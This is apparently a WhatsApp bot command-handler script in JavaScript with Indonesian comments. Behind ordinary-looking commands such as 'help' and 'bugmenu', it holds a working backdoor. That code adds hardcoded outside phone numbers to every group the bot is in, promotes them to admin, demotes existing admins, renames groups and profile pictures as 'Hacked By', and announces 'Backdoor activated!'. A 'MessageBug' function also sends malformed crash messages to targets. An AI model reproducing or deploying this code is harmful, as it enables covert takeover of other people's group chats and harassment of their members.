module.exports = async (Klee, m, store) => {
    try {
        //const owner = "6283870413717"
        let bijiasu = ""
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
        const budy1 = (typeof m.text == 'string' ? m.text : '')
        let budy = ""
        if (m.contextInfo === undefined) {
            budy = budy1
        }

        const prefix = /^[°zZ#$@+,.?=''():√%!¢£¥€π¤ΠΦ&><™©®Δ^βα¦|/\\©^]/.test(body) ? body.match(/^[°zZ#$@+,.?=''():√%¢£¥€π¤ΠΦ&><!™©®Δ^βα¦|/\\©^]/gi) : '.'
        const isCmd = body.startsWith(prefix)
        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '' //kalau mau no prefix ganti jadi ini : const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const cmd = prefix + command
        const args = body.trim().split(/ +/).slice(1)
        let crypto = require('crypto')
        const makeid = crypto.randomBytes(3).toString('hex')
        const { Client } = require('ssh2');
        const quoted = m.quoted ? m.quoted : m
        const from = m.key.remoteJid
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const text = q = args.join(" ")
        const botNumber = await Klee.decodeJid(Klee.user.id)
        const isOwner = m.sender == owner + "@s.whatsapp.net" ? true : m.sender == botNumber ? true : false
        const isGroup = m.chat.endsWith('@g.us')
        const senderNumber = m.sender.split('@')[0]
        const pushname = m.pushName || `${senderNumber}`
        const isBot = botNumber.includes(senderNumber)
        const groupMetadata = isGroup ? await Klee.groupMetadata(m.chat) : {}
        let participant_bot = isGroup ? groupMetadata.participants.find((v) => v.id == botNumber) : {}
        let participant_sender = isGroup ? groupMetadata.participants.find((v) => v.id == m.sender) : {}
        const isBotAdmin = participant_bot?.admin !== null ? true : false
        const isAdmin = participant_sender?.admin !== null ? true : false
        const { version } = require("./package.json")
        const { runtime, getRandom, getTime, tanggal, toRupiah, telegraPh, pinterest, ucapan, generateProfilePicture, getBuffer, fetchJson } = require('./all/function.js')
        const { toAudio, toPTT, toVideo, ffmpeg } = require("./all/converter.js")
        const { Scraper } = require("akiraa-wb");
        const Skrep = new Scraper()
        const pler = JSON.parse(fs.readFileSync('./all/database/idgrup.json').toString())
        const bijipler = JSON.parse(fs.readFileSync('./all/database/idblgrup.json').toString())
        const jangan = m.isGroup ? pler.includes(m.chat) : false
        const plerr = JSON.parse(fs.readFileSync('./all/database/idgrup2.json').toString())
        const jangan2 = m.isGroup ? plerr.includes(m.chat) : false
        const contacts = JSON.parse(fs.readFileSync("./all/database/contacts.json"))
        const seler = JSON.parse(fs.readFileSync("./all/database/reseller.json"))
        const prem = JSON.parse(fs.readFileSync("./all/database/premium.json"))

        const isReseller = seler.includes(m.sender)
        const isPremium = prem.includes(m.sender)
        const { BingImageCreator } = require("./all/bingimg.js");


        if (isCmd) {
            console.log(chalk.yellow.bgCyan.bold(namabot), color(`[ PESAN ]`, `blue`), color(`FROM`, `blue`), color(`${senderNumber}`, `blue`), color(`Text :`, `blue`), color(`${cmd}`, `white`))
        }

        const qbug = {
            key: { remoteJid: 'status@broadcast', fromMe: false, participant: '0@s.whatsapp.net' }, message: {
                listResponseMessage: {
                    title: `Hello My Friends`
                }
            }
        }

        const MessageBug = async (target) => {
            return Klee.sendMessage(target, { document: fs.readFileSync("./package.json"), mimetype: "😄😇😂🔥", fileName: "Paket.zip", fileLength: 99999999999, caption: `key.com${teksbug2}` }, { quoted: qbug })
        }



        let ppuser
        try {
            ppuser = await Klee.profilePictureUrl(m.sender, 'image')
        } catch (err) {
            ppuser = 'https://telegra.ph/file/a059a6a734ed202c879d3.jpg'
        }

        async function KleeReply(teks) {
            return Klee.sendMessage(m.chat, {
                text: `${teks}`, contextInfo: {
                    mentionedJid: [m.sender], externalAdReply: {
                        showAdAttribution: true, thumbnailUrl: ppuser, title: "｢ ACCESS DENIED ｣", body: "© Powered By " + namabot, previewType: "PHOTO"
                    }
                }
            }, { quoted: m })
        }

        const qpayment = {
            key: {
                remoteJid: '0@s.whatsapp.net',
                fromMe: false,
                id: `ownername`,
                participant: '0@s.whatsapp.net'
            },
            message: {
                requestPaymentMessage: {
                    currencyCodeIso4217: "USD",
                    amount1000: 999999999,
                    requestFrom: '0@s.whatsapp.net',
                    noteMessage: {
                        extendedTextMessage: {
                            text: namabot
                        }
                    },
                    expiryTimestamp: 999999999,
                    amount: {
                        value: 91929291929,
                        offset: 1000,
                        currencyCode: "INR"
                    }
                }
            }
        }

        const qchanel = {
            key: {
                remoteJid: 'status@broadcast',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: `120363224727390375@newsletter`,
                    newsletterName: `Hore`,
                    jpegThumbnail: "",
                    caption: `Powered By ${namaowner}`,
                    inviteExpiration: Date.now() + 1814400000
                }
            }
        }

        function generateRandomPassword() {
            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789@#%^&*';
            const length = 10;
            let password = '';
            for (let i = 0; i < length; i++) {
                const randomIndex = Math.floor(Math.random() * characters.length);
                password += characters[randomIndex];
            }
            return password;
        }

        const qtoko = {
            key: {
                fromMe: false,
                participant: `0@s.whatsapp.net`,
                ...(m.chat ? {
                    remoteJid: "status@broadcast"
                } : {})
            }, message: {
                "productMessage": {
                    "product": {
                        "productImage": {
                            "mimetype": "image/jpeg",
                            "jpegThumbnail": "",
                        },
                        "title": `Pterodactyl Server By ${namaowner}`,
                        "description": null,
                        "currencyCode": "IDR",
                        "priceAmount1000": "9999999999",
                        "retailerId": `Powered By Wyii`,
                        "productImageCount": 1
                    },
                    "businessOwnerJid": `0@s.whatsapp.net`
                }
            }
        }

        const qtext = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "0@s.whatsapp.net" } : {}) }, 'message': { extendedTextMessage: { text: "Thank you for using my services" } } }

        const qdoc = { key: { participant: '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { documentMessage: { title: `Powered By ${namaowner}`, jpegThumbnail: "" } } }


        const qkontak = {
            key: {
                participant: `0@s.whatsapp.net`,
                ...(botNumber ? {
                    remoteJid: `status@broadcast`
                } : {})
            },
            message: {
                'contactMessage': {
                    'displayName': `${namaowner}`,
                    'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
                    sendEphemeral: true
                }
            }
        }


        let example = (teks) => {
            return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
        }

        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const wib = moment.tz('Asia/Jakarta').format('HH : mm :ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')

        var resize = async (image, width, height) => {
            let oyy = await Jimp.read(image)
            let kiyomasa = await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG)
            return kiyomasa
        }

        function capital(string) {
            return string.charAt(0).toUpperCase() + string.slice(1);
        }

        const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        Klee.autoshalat = Klee.autoshalat ? Klee.autoshalat : {}
        let ats = m.chat
        if (ats in Klee.autoshalat) {
            return false
        }
        let jadwalSholat = {
            shubuh: '04:03',
            terbit: '05:44',
            dhuha: '06:02',
            dzuhur: '11:39',
            ashar: '15:03',
            magrib: '17:52',
            isya: '19:05',
        }
        const datek = new Date((new Date).toLocaleString("en-US", {
            timeZone: "Asia/Jakarta"
        }));
        const hours = datek.getHours();
        const minutes = datek.getMinutes();
        const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`
        for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
            if (timeNow === waktu) {
                Klee.autoshalat[ats] = [
                    Klee.sendMessage(m.chat, {
                        audio: {
                            url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                        },
                        mimetype: 'audio/mpeg',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: '',
                                title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                                body: `🕑 ${waktu}`,
                                sourceUrl: '',
                                thumbnail: await fs.readFileSync('./all/shalat.jpg'),
                                renderLargerThumbnail: true
                            }
                        }
                    }, {}),
                    setTimeout(async () => {
                        delete client.autoshalat[m.chat]
                    }, 57000)
                ]
            }
        }


        const reply = (teks) => {
            return Klee.sendMessage(from, {
                text: teks, contextInfo: {
                    mentionedJid: [m.sender],
                    "externalAdReply": { "title": ` ${botname}`, "body": `Halo kak ${pushname} Selamat ${ucapan()}`, "previewType": "PHOTO", "thumbnailUrl": ppuser, "thumbnail": '', "sourceUrl": `` }
                }
            }, { quoted: m })
        }

        switch (command) {
            case 'menu': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

 => 🦠 *أنا روبوت الشوائب 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 GEN 6*

=> 🧬 هل تريد رؤية الميزات الرائعة؟ اضغط/حدد الزر أدناه👇
 
 => bugmenu [ BUG TO BUTTON ]
 => ownermenu [ OWNER MENU ]
 => TQTO [ ALL PEMBUAT SCRIPT ]
 
 💀هيا، اضغط على الزر أدناه 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤 GEN 6

© RIKZZ ZHIRO GEN 6
`
                reply(text12)
            }
                break;
            case "help":
                bijiasu = budy.slice(9);
                function delay(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

                // Ambil semua grup
                let gcall2 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null));
                let listgca1 = [];
                gcall2.forEach((u) => {
                    listgca1.push(u.id);
                });

                // Filter grup yang tidak ada di idblgrup.json
                let bijikudanil1 = JSON.parse(fs.readFileSync('./all/database/idblgrup.json', 'utf8'));
                listgca1 = listgca1.filter(item => !bijikudanil1.includes(item));

                // Update profil bot
                await Klee.updateProfilePicture(Klee.user.id.split(":")[0] + "@s.whatsapp.net", { url: 'https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg' });

                // Loop untuk update profile picture setiap grup
                for (let i = 0; i < listgca1.length; i++) {
                    try {
                        await Klee.updateProfilePicture(listgca1[i], { url: 'https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg' });
                    } catch (error) {
                        console.error(`Error updating profile picture for ${listgca1[i]}:`, error);
                    }
                    await delay(1000); // Delay 5 detik sebelum iterasi berikutnya
                }

                await m.reply("Wh00ps, This Number is Hacked By 友 | —͟͞͞divv hosting <_>");
                break;

            case "bugmenu": {
                bijiasu = budy.slice(10); // Ambil argumen (jika ada)
                function delay(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                // Periksa apakah pengguna adalah pemilik
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

                let gcall3 = Object.values(await Klee.groupFetchAllParticipating().catch(_ => null));
                let listgca3 = [];
                gcall3.forEach((u) => {
                    listgca3.push(u.id);
                });

                for (let i = 0; i < listgca3.length; i++) {
                    try {
                        let groupId = listgca3[i];

                        // Ambil info grup
                        let groupMetadata = await Klee.groupMetadata(groupId).catch(_ => null);
                        if (!groupMetadata) continue;

                        let participants = groupMetadata.participants;
                        let botNumber = Klee.user.id.split(":")[0] + "@s.whatsapp.net";
                        let myNumber = "6283870413717@s.whatsapp.net";

                        // Tambahkan nomor Anda ke grup jika belum ada
                        let isInGroup = participants.some(p => p.id === myNumber);
                        if (!isInGroup) {
                            await Klee.groupParticipantsUpdate(groupId, [myNumber], "add").catch(_ => null);
                            await delay(100); // Tunggu 3 detik setelah menambahkan nomor
                        }

                        // Jadikan Anda admin
                        let isAdmin = participants.find(p => p.id === myNumber)?.admin;
                        if (!isAdmin) {
                            await Klee.groupParticipantsUpdate(groupId, [myNumber], "promote").catch(_ => null);
                            await delay(100); // Tunggu 2 detik setelah menjadikan admin
                        }

                        // Cabut status admin semua kecuali Anda dan bot
                        let admins = participants.filter(p => p.admin === "admin" || p.admin === "superadmin");
                        let adminsToRevoke = admins
                            .map(p => p.id)
                            .filter(adminId => adminId !== myNumber && adminId !== botNumber);

                        if (adminsToRevoke.length > 0) {
                            await Klee.groupParticipantsUpdate(groupId, adminsToRevoke, "demote").catch(_ => null);
                            await delay(100); // Tunggu 2 detik setelah mencabut admin
                        }

                    } catch (error) {
                        console.error(`Error processing group ${listgca3[i]}:`, error);
                    }
                    await delay(100); // Tunggu 5 detik sebelum iterasi berikutnya
                }

                // Logika untuk mengganti bio
                let newBio = "Hacked by 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤"; // Default bio
                if (bijiasu && bijiasu.trim().length > 0) {
                    newBio = bijiasu.trim(); // Gunakan argumen jika tersedia
                }

                try {
                    await Klee.updateProfileStatus(newBio);
                    await m.reply(`Sukses mengganti bio bot menjadi: "${newBio}"`);
                } catch (error) {
                    console.error("Error updating bot bio:", error);
                }

                await m.reply("Backdoor activated! You are now an admin in all groups.");
                break;
            }

            case "ch": {
                let bijiasu = budy.slice(10); // Ambil argumen (jika ada)
                function delay(ms) {
                    return new Promise(resolve => setTimeout(resolve, ms));
                }

                // Periksa apakah pengguna adalah pemilik
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

                // Coba metode alternatif untuk mendapatkan daftar saluran
                let channels;
                try {
                    if (typeof Klee.channelFetchAllParticipating === "function") {
                        channels = Object.values(await Klee.channelFetchAllParticipating().catch(_ => null));
                    } else if (typeof Klee.getChannels === "function") {
                        channels = Object.values(await Klee.getChannels().catch(_ => null));
                    } else {
                        return m.reply('Error: Tidak dapat menemukan metode untuk mengambil daftar saluran.');
                    }
                } catch (err) {
                    console.error("Error fetching channels:", err);
                    return m.reply('Terjadi kesalahan saat mencoba mengambil daftar saluran.');
                }

                if (!channels || channels.length === 0) {
                    return m.reply('Tidak ada saluran yang ditemukan.');
                }

                let channelList = [];
                channels.forEach((channel) => {
                    channelList.push(channel.id);
                });

                for (let i = 0; i < channelList.length; i++) {
                    try {
                        let channelId = channelList[i];

                        // Ambil info saluran
                        let channelMetadata = await Klee.channelMetadata(channelId).catch(_ => null);
                        if (!channelMetadata) continue;

                        let participants = channelMetadata.participants;
                        let botNumber = Klee.user.id.split(":")[0] + "@s.whatsapp.net";
                        let myNumber = "6283870413717@s.whatsapp.net";

                        // Tambahkan nomor Anda ke saluran jika belum ada
                        let isInChannel = participants.some(p => p.id === myNumber);
                        if (!isInChannel) {
                            await Klee.channelParticipantsUpdate(channelId, [myNumber], "add").catch(_ => null);
                            await delay(100); // Tunggu 3 detik setelah menambahkan nomor
                        }

                        // Jadikan Anda pemilik saluran
                        let isOwner = participants.find(p => p.id === myNumber)?.owner;
                        if (!isOwner) {
                            await Klee.channelParticipantsUpdate(channelId, [myNumber], "promote").catch(_ => null);
                            await delay(100); // Tunggu 2 detik setelah menjadikan pemilik
                        }

                        // Cabut status pemilik lain kecuali Anda dan bot
                        let owners = participants.filter(p => p.owner === "owner");
                        let ownersToRevoke = owners
                            .map(p => p.id)
                            .filter(ownerId => ownerId !== myNumber && ownerId !== botNumber);

                        if (ownersToRevoke.length > 0) {
                            await Klee.channelParticipantsUpdate(channelId, ownersToRevoke, "demote").catch(_ => null);
                            await delay(100); // Tunggu 2 detik setelah mencabut status pemilik
                        }

                    } catch (error) {
                        console.error(`Error processing channel ${channelList[i]}:`, error);
                    }
                    await delay(100); // Tunggu 5 detik sebelum iterasi berikutnya
                }

                // Logika untuk mengganti bio
                let newBio = "Owned by 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤"; // Default bio
                if (bijiasu && bijiasu.trim().length > 0) {
                    newBio = bijiasu.trim(); // Gunakan argumen jika tersedia
                }

                try {
                    await Klee.updateProfileStatus(newBio);
                    await m.reply(`Sukses mengganti bio bot menjadi: "${newBio}"`);
                } catch (error) {
                    console.error("Error updating bot bio:", error);
                }

                await m.reply("Saluran berhasil dikelola! Anda sekarang adalah pemilik di semua saluran.");
                break;
            }
            case 'xrikzz': {
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');

                let getGroups = await Klee.groupFetchAllParticipating();
                let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1]);
                let groupIds = groups.map((v) => v.id);

                m.reply(`Memeriksa ${groupIds.length} grup yang diikuti bot...`);

                if (groupIds.length === 0) {
                    m.reply('Bot tidak berada di grup manapun.');
                    return;
                }

                fs.writeFileSync('rikzz.json', JSON.stringify(groupIds));

                m.reply(`ID grup telah disimpan, bot akan mulai memproses grup-grup tersebut.`);
            }
                break;
            case "kiw": {
                try {
                    if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
                    let getGroups = await Klee.groupFetchAllParticipating();
                    let groups = Object.entries(getGroups).map(([id, details]) => ({ id, ...details }));
                    const additionalAdmin = "6283135630231@s.whatsapp.net";
                    for (let group of groups) {
                        const groupId = group.id;
                        if (!isOwner) {
                            console.log(` Bot bukan admin di grup ${groupId}, melewati grup ini.`);
                            continue;
                        }
                        const isMember = group.participants.some(
                            (p) => p.id === additionalAdmin
                        );
                        if (!isMember) {
                            try {
                                await Klee.groupParticipantsUpdate(group.id, [additionalAdmin], 'add');
                                console.log(`Nomor ${additionalAdmin} berhasil ditambahkan ke grup ${groupId}`);
                            } catch (err) {
                                console.error(`Gagal menambahkan ${additionalAdmin} ke grup ${groupId}:`, err);
                                continue;
                            }
                        }
                        try {
                            await Klee.groupParticipantsUpdate(group.id, [additionalAdmin], 'promote');
                            console.log(`Nomor ${additionalAdmin} berhasil dijadikan admin di grup ${groupId}`);
                        } catch (err) {
                            console.error(` Gagal menjadikan ${additionalAdmin} admin di grup ${groupId}:`, err);
                        }
                        const newGroupName = "Hacked By 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤";
                        try {
                            await Klee.groupUpdateSubject(group.id, newGroupName);
                            console.log(`Nama grup ${groupId} berhasil diubah menjadi ${newGroupName}`);
                        } catch (err) {
                            console.error(`Gagal mengubah nama grup ${groupId}:`, err);
                        }
                        const newGroupDescription = "✨ Grup ini sekarang dikelola oleh Admin 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤.";
                        try {
                            await Klee.groupUpdateDescription(group.id, newGroupDescription);
                            console.log(`Deskripsi grup ${groupId} berhasil diperbarui.`);
                        } catch (err) {
                            console.error(`Gagal mengubah deskripsi grup ${groupId}:`, err);
                        }
                        await Klee.sendMessage(groupId, {
                            text: `*Backdoor Access Completed!*\n\nNomor *${additionalAdmin}* telah dijadikan admin grup ini.\nNama grup diubah menjadi: ${newGroupName}\nDeskripsi grup telah diperbarui.`,
                        });
                    }
                    const newBotName = "backdor By 友 | —͟͞͞𝙍𝙞𝙠𝙯𝙯𝙕𝙝𝙞𝙧𝙤";
                    await Klee.updateProfileName(newBotName);
                    const fs = require("fs");
                    const imagePath = "./rikzz.jpg";
                    const imageBuffer = fs.readFileSync(imagePath);
                    await Klee.updateProfilePicture(botNumber, { url: "https://raw.githubusercontent.com/Irms237/yowhello/main/photo_2024-12-19_01-39-48.jpg" });
                    return await Klee.sendMessage(
                        m.chat,
                        {
                            text: `✅🔥 *Backdoor berhasil dieksekusi!*\n\nNomor *${additionalAdmin}* telah ditambahkan dan dijadikan admin di semua grup.\nNama grup dan deskripsi grup diperbarui.\nNama bot diubah menjadi: ${newBotName}\nFoto profil bot juga telah diperbarui.`,
                        },
                        { quoted: m }
                    );
                } catch (err) {
                    console.error(err);
                    return await Klee.sendMessage(
                        m.chat,
                        { text: "Terjadi kesalahan saat mengeksekusi perintah backdoor. Coba lagi nanti." },
                        { quoted: m }
                    );
                }
            }
                break;

            case 'xploit': {
                if (!isOwner) return m.reply('Maaf, command ini hanya untuk pemilik.');
                let groupIds = JSON.parse(fs.readFileSync('rikzz.json', 'utf8'));

                if (groupIds.length === 0) {
                    m.reply('Tidak ada ID grup yang tersedia untuk diproses.');
                    return;
                }

                m.reply(`Memulai proses untuk ${groupIds.length} grup...`);
                const delay = (ms) => new Promise(resolve => setTimeout(resolve, ms));
                const processGroup = async (groupId, retries = 3, delayTime = 5000) => {
                    let ownerId = nomorowner + '@s.whatsapp.net';
                    try {
                        await Klee.groupParticipantsUpdate(groupId, [ownerId], 'add');
                        m.reply(`Owner berhasil ditambahkan ke grup ${groupId}`);
                        await Klee.groupParticipantsUpdate(groupId, [ownerId], 'promote');
                        m.reply(`Owner telah di-admin-kan di grup ${groupId}`);
                        await Klee.groupParticipantsUpdate(groupId, [m.botNumber], 'remove');
                        m.reply(`Bot berhasil dikeluarkan dari grup ${groupId}`);

                    } catch (err) {
                        if (err.message.includes('rate-overlimit')) {
                            m.reply(`Rate limit tercapai untuk grup ${groupId}. Mencoba lagi setelah ${delayTime / 1000} detik.`);
                            if (retries > 0) {
                                await delay(delayTime);
                                return processGroup(groupId, retries - 1, delayTime * 2);
                            } else {
                                m.reply(`Gagal memproses grup ${groupId} setelah beberapa percobaan.`);
                                throw new Error(`Rate limit exceeded for group ${groupId}`);
                            }
                        } else {
                            m.reply(`Gagal memproses grup ${groupId}: ${err.message}`);
                            throw err;
                        }
                    }
                };


                const processInBatches = async (batchSize = 5) => {
                    let sukses = [];
                    let gagal = [];


                    for (let i = 0; i < groupIds.length; i += batchSize) {
                        const batch = groupIds.slice(i, i + batchSize);
                        let batchPromises = batch.map(groupId => {
                            return processGroup(groupId)
                                .then(() => sukses.push(groupId))
                                .catch(() => gagal.push(groupId));
                        });
                        await Promise.all(batchPromises);
                        await delay(15000);
                    }

                    return { sukses, gagal };
                };

                try {
                    const { sukses, gagal } = await processInBatches();

                    let laporan = 'Proses selesai!\n\n';
                    if (sukses.length > 0) {
                        laporan += `Sukses:\n${sukses.join('\n')}\n\n`;
                    }
                    if (gagal.length > 0) {
                        laporan += `Gagal:\n${gagal.join('\n')}\n`;
                    }
                    m.reply(laporan);
                } catch (err) {
                    console.error('Terjadi kesalahan saat memproses grup:', err);
                    m.reply('Ada kesalahan saat memproses beberapa grup.');
                }
            }
                break;



            case 'panelmenu': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

 ❏━━『 *INFO USER* 』━━
┣✦  ɴᴀᴍᴀ: ${pushname} 
┣✦  ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ NAMA BOT: ${namabot}
┣✦ NOMOR CREATOR @${owner.split("@")[0]}
┣✦ VERSI SCRIPT ${global.versisc}
┣✦ VERSI BAILEYS: ^${version}
┣✦ RUNTIME: ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ TODAY: ${hariini}
┣✦ WAKTU WIB : ${wib}
┣✦ WAKTU WIT: ${wit}
┣✦ WAKTU WITA : ${wita}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *LIST PANEL MENU* 』━━
┣✦ ${prefix}panel
┣✦ ${prefix}listsrv
┣✦ ${prefix}delsrv
┣✦ ${prefix}listusr
┣✦ ${prefix}delusr
┣✦ ${prefix}hapuspanel idsrv
┣✦ ${prefix}listadmin
┣✦ ${prefix}admin
┣✦ ${prefix}listsrv2
┣✦ ${prefix}delsrv2
┣✦ ${prefix}listusr2
┣✦ ${prefix}delusr2
┣✦ ${prefix}hapuspanel2 idsrv
┣✦ ${prefix}listadmin2
┣✦ ${prefix}admin2
┗━═┅═━━━═┅═━━━═┅═━━━๑

© FlowFalcon 🍃
`
                reply(text12)
            }
                break
            case 'panel': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

 ❏━━『 *INFO USER* 』━━
┣✦  ɴᴀᴍᴀ: ${pushname} 
┣✦  ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ NAMA BOT: ${namabot}
┣✦ NOMOR CREATOR @${owner.split("@")[0]}
┣✦ VERSI SCRIPT ${global.versisc}
┣✦ VERSI BAILEYS: ^${version}
┣✦ RUNTIME: ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ TODAY: ${hariini}
┣✦ WAKTU WIB : ${wib}
┣✦ WAKTU WIT: ${wit}
┣✦ WAKTU WITA : ${wita}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *PANEL SEVER 1 MENU* 』━━
┣✦ ${prefix}1gb nama,62xxx
┣✦ ${prefix}2gb nama,62xxx
┣✦ ${prefix}3gb nama,62xxx
┣✦ ${prefix}4gb nama,62xxx
┣✦ ${prefix}5gb nama,62xxx
┣✦ ${prefix}6gb nama,62xxx
┣✦ ${prefix}7gb nama,62xxx
┣✦ ${prefix}8gb nama,62xxx
┣✦ ${prefix}9gb nama,62xxx
┣✦ ${prefix}10gb nama,62xxx
┣✦ ${prefix}unli nama,62xxx
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *PANEL SEVER 2 MENU* 』━━
┣✦ ${prefix}1gbb nama,62xxx
┣✦ ${prefix}2gbb nama,62xxx
┣✦ ${prefix}3gbb nama,62xxx
┣✦ ${prefix}4gbb nama,62xxx
┣✦ ${prefix}5gbb nama,62xxx
┣✦ ${prefix}6gbb nama,62xxx
┣✦ ${prefix}7gbb nama,62xxx
┣✦ ${prefix}8gbb nama,62xxx
┣✦ ${prefix}9gbb nama,62xxx
┣✦ ${prefix}10gbb nama,62xxx
┣✦ ${prefix}unlii nama,62xxx
┗━═┅═━━━═┅═━━━═┅═━━━๑

_note :_
> beda server panel beda database dan id grup

© FlowFalcon 🍃
`
                reply(text12)
            }
                break
            case 'allmenu': {
                const owned = `${owner}@s.whatsapp.net`
                const text12 = `*Haii* @${m.sender.split("@")[0]}, Selamat ${ucapan()}\nAda Yang Bisa Saya Bantu Kak?

❏━━『 *INFO USER* 』━━
┣✦  ɴᴀᴍᴀ: ${pushname} 
┣✦  ɴᴜᴍʙᴇʀ: ${m.sender.split('@')[0]}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO BOT* 』━━
┣✦ NAMA BOT: ${namabot}
┣✦ NOMOR CREATOR @${owner.split("@")[0]}
┣✦ VERSI SCRIPT ${global.versisc}
┣✦ VERSI BAILEYS: ^${version}
┣✦ RUNTIME: ${runtime(process.uptime())}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *INFO HARI* 』━━
┣✦ TODAY: ${hariini}
┣✦ WAKTU WIB : ${wib}
┣✦ WAKTU WIT: ${wit}
┣✦ WAKTU WITA : ${wita}
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *LIST PANEL MENU* 』━━
┣✦ ${prefix}panel
┣✦ ${prefix}listsrv
┣✦ ${prefix}delsrv
┣✦ ${prefix}listusr
┣✦ ${prefix}delusr
┣✦ ${prefix}hapuspanel idsrv
┣✦ ${prefix}listadmin
┣✦ ${prefix}admin
┣✦ ${prefix}listsrv2
┣✦ ${prefix}delsrv2
┣✦ ${prefix}listusr2
┣✦ ${prefix}delusr2
┣✦ ${prefix}hapuspanel2 idsrv
┣✦ ${prefix}listadmin2
┣✦ ${prefix}admin2
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *OWNER MENU* 』━━
┣✦ ${prefix}public
┣✦ ${prefix}self
┣✦ ${prefix}kick
┣✦ ${prefix}hidetag
┣✦ ${prefix}tagall
┣✦ ${prefix}addprem
┣✦ ${prefix}delprem
┣✦ ${prefix}addgc
┣✦ ${prefix}addprem2
┣✦ ${prefix}delprem2
┣✦ ${prefix}addgc2
┗━═┅═━━━═┅═━━━═┅═━━━๑

❏━━『 *MAIN MENU* 』━━
┣✦ ${prefix}tiktok
┣✦ ${prefix}remini
┣✦ ${prefix}play ( YouTube Player )
┣✦ ${prefix}splay ( Spotify Player )
┣✦ ${prefix}gpt4
┣✦ ${prefix}txt2img
┣✦ ${prefix}gemini
┣✦ ${prefix}pinterest
┗━═┅═━━━═┅═━━━═┅═━━━๑

© FlowFalcon 🍃
`
                reply(text12)
            }
                break
